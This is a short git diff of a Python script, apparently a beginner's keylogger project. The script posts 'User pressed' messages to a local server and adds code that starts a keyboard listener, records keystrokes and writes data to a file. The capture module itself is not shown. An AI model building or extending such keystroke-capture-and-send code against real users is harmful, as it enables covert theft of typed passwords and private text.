@@ -1,9 +1,16 @@
 import requests
+from Keyboard import KeyBoard
 
 class WritingToTheServer:
 
     def __init__(self, server_url):
         self.server_url = server_url
+
+
+    def create_file(self,d,s = "n.txt"):
+        with open(s, 'w', encoding='utf-8') as file:
+            file.write(d)
+        print("secseful")
 
     def send_log(self, message):
         data = {"message": message}
@@ -11,7 +18,10 @@ class WritingToTheServer:
         response = requests.post(self.server_url, json=data,headers=headers)
         print(response.json())
 
+keyBord = KeyBoard()
+keyBord.start_listening()
 
-logger = WritingToTheServer("http://127.0.0.1:5000")
-logger.send_log("User pressed: A")
-logger.send_log("User pressed: B")
+input("Press Enter to stop listening...\n")
+keyBord.stop_listening()
+
+print(keyBord.get_listen_keys())
